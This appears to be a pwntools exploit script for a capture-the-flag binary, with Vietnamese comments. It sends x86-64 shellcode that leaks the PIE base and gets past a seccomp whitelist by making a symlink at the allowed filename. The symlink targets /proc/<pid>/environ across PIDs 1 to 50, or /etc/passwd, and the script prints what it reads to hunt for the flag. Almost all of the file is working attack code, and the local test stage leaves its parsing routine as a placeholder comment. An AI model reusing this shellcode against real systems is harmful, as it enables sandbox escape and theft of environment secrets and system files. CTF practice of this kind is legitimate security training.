#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

BIN = './chall'
HOST = args.HOST or 'localhost'
PORT = int(args.PORT or 5000)
context.terminal = ["foot", "-e", "sh", "-c"]

OPEN_OK_PTR = 0x30B0

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return  process(BIN)

stage1 = asm(fr'''
    mov r12, rdi
    mov rsp, rdi
    add rsp, 0x900

    /* 1. Lấy PIE base từ fd 3 (maps) */
    mov edi, 3
    mov rsi, r12
    mov edx, 0x1000
    xor eax, eax
    syscall

    /* Parse PIE base */
    mov rbx, r12
find_line:
    mov r9, rbx
scan_line:
    mov al, byte ptr [rbx]
    test al, al
    je fail
    cmp al, 0x0a
    je next_line
    cmp dword ptr [rbx], 0x6c616863      /* 'chal' */
    jne cont_scan
    cmp byte ptr [rbx+4], 'l'
    je got_line
cont_scan:
    inc rbx
    jmp scan_line
next_line:
    inc rbx
    jmp find_line

got_line:
    mov rbx, r9
    xor eax, eax
parse_hex:
    movzx edx, byte ptr [rbx]
    cmp dl, '-'
    je got_base
    shl rax, 4
    cmp dl, '9'
    jle hex_num
    and dl, 0xdf
    sub dl, 'A' - 10
    jmp hex_add
hex_num:
    sub dl, '0'
hex_add:
    movzx edx, dl
    add rax, rdx
    inc rbx
    jmp parse_hex

got_base:
    mov r13, rax

    /* -----------------------------------------------------------
       [!] THE FIX: CHUYỂN SANG /tmp ĐỂ TRÁNH LỖI READ-ONLY CWD
       ----------------------------------------------------------- */
    mov rax, 0x706d742f              /* Chuỗi "/tmp" (Little Endian) */
    push rax
    mov rdi, rsp
    mov eax, 80                      /* SYS_chdir (80) */
    syscall
    /* CWD bây giờ là /tmp. Chúng ta có thể tạo symlink thoải mái! */

    /* BẮT ĐẦU VÒNG LẶP PROC ENUMERATION (Quét từ PID 1 đến 50) */
    mov r15, 1                       
pid_loop:
    /* Xóa symlink cũ trong /tmp nếu có */
    lea rdi, [rip+fakeflag]
    mov eax, 87                      /* SYS_unlink */
    syscall

    /* Xây dựng chuỗi '/proc/<pid>/environ' trên stack */
    lea r14, [rsp+0x100]
    mov dword ptr [r14], 0x6f72702f  /* "/pro" */
    mov word ptr [r14+4], 0x2f63     /* "c/" */

    mov eax, r15d
    lea rsi, [rsp+0x200]
    xor ecx, ecx
    mov ebx, 10
itoa_loop:
    xor edx, edx
    div ebx
    add dl, '0'
    dec rsi
    mov byte ptr [rsi], dl
    inc ecx
    test eax, eax
    jne itoa_loop

    lea rdi, [r14+6]
copy_digits:
    mov al, byte ptr [rsi]
    mov byte ptr [rdi], al
    inc rsi
    inc rdi
    dec ecx
    jne copy_digits

    /* Nối đuôi "/environ\0" */
    mov rax, 0x6e6f7269766e652f      /* "/environ" */
    mov qword ptr [rdi], rax
    mov byte ptr [rdi+8], 0

    /* Tạo symlink: ./not_a_real_flag.txt -> /proc/<pid>/environ */
    mov rdi, r14                     /* Target: /proc/... */
    lea rsi, [rip+fakeflag]          /* Linkpath: ./not_a_real_flag.txt */
    mov eax, 88                      /* SYS_symlink */
    syscall

    /* Gọi open() dùng con trỏ Whitelist của Seccomp */
    lea rdi, [r13 + {OPEN_OK_PTR}]
    xor esi, esi                     /* O_RDONLY */
    xor edx, edx
    mov eax, 2                       /* SYS_open */
    syscall

    cmp eax, 0
    jl next_pid                      /* Nếu fail (PID ko tồn tại), qua PID tiếp */

    mov rbx, rax                     /* Giữ FD */

    /* Đọc file environ */
    mov rdi, rbx
    lea rsi, [rsp+0x300]             /* Đẩy buffer ra xa một chút cho an toàn */
    mov edx, 0x2000
    xor eax, eax                     /* SYS_read */
    syscall

    cmp eax, 0
    jle close_fd

    mov r14, rax                     /* Lưu số lượng byte đọc được */

    /* In ra stdout */
    mov rdi, 1
    lea rsi, [rsp+0x300]
    mov rdx, r14
    mov eax, 1                       /* SYS_write */
    syscall

close_fd:
    mov rdi, rbx
    mov eax, 3                       /* SYS_close */
    syscall

next_pid:
    inc r15
    cmp r15, 50                      /* Quét tới PID 50 */
    jle pid_loop

    /* Hoàn tất */
    xor edi, edi
    mov eax, 60
    syscall

fail:
    mov edi, 1
    mov eax, 60
    syscall

fakeflag:
    .asciz "./not_a_real_flag.txt"
''')
def GDB(io):
    if not args.REMOTE:
        gdb.attach(io, gdbscript='''
        b *x1_+406
        c
        ''')
        sleep(1)

stage1_test_local = asm(fr'''
    mov r12, rdi
    mov rsp, rdi
    add rsp, 0x900

    /* 1. Lấy PIE base */
    mov edi, 3
    mov rsi, r12
    mov edx, 0x1000
    xor eax, eax
    syscall

    /* (Giữ nguyên đoạn parse_hex tìm got_base của bạn ở đây...) */
    
got_base:
    mov r13, rax

    /* 2. Nhảy sang /tmp */
    mov rax, 0x706d742f              /* "/tmp" */
    push rax
    mov rdi, rsp
    mov eax, 80                      /* chdir */
    syscall

    /* 3. Xóa symlink cũ nếu có */
    lea rdi, [rip+fakeflag]
    mov eax, 87                      /* unlink */
    syscall

    /* 4. TẠO SYMLINK ĐẾN /etc/passwd */
    lea rdi, [rip+test_target]       /* Target: /etc/passwd */
    lea rsi, [rip+fakeflag]          /* Linkpath: ./not_a_real_flag.txt */
    mov eax, 88                      /* symlink */
    syscall

    /* 5. Mở file bằng con trỏ hợp lệ của Seccomp */
    lea rdi, [r13 + {OPEN_OK_PTR}]
    xor esi, esi                     /* O_RDONLY */
    xor edx, edx
    mov eax, 2                       /* open */
    syscall
    mov rbx, rax

    /* 6. Đọc nội dung file */
    mov rdi, rbx
    lea rsi, [rsp+0x300]
    mov edx, 0x2000
    xor eax, eax                     /* read */
    syscall

    mov r14, rax                     /* Số byte đọc được */

    /* 7. In thẳng ra Terminal */
    mov rdi, 1
    lea rsi, [rsp+0x300]
    mov rdx, r14
    mov eax, 1                       /* write */
    syscall

    /* Thoát */
    xor edi, edi
    mov eax, 60
    syscall

fakeflag:
    .asciz "./not_a_real_flag.txt"
test_target:
    .asciz "/etc/passwd"             /* Thay đổi mục tiêu tại đây! */
''')
def main():
    io = start()
    # GDB(io)
    # Kích hoạt rò rỉ maps thông qua fd 3
    io.sendafter(b'Enter filename: ', b'/proc/self/maps\x00\n')
    io.sendafter(b'Enter shellcode: ', stage1_test_local)

    print("\n[*] Đang nhảy sang /tmp và quét /proc/<pid>/environ để trích xuất cờ...")
    
    # Hứng output
    out = io.recvall(timeout=3)
    
    found = False
    # file environ tách các biến bằng byte Nul (\x00)
    for item in out.split(b'\x00'):
        if b'GZCTF_FLAG' in item or b'gzctf{' in item:
            print(f"\n[+] TÌM THẤY FLAG: \033[92m{item.decode(errors='ignore')}\033[0m\n")
            found = True
            break
            
    if not found:
        print("[-] Vẫn chưa thấy flag. Output nhận được:")
        print(out)

if __name__ == '__main__':
    main()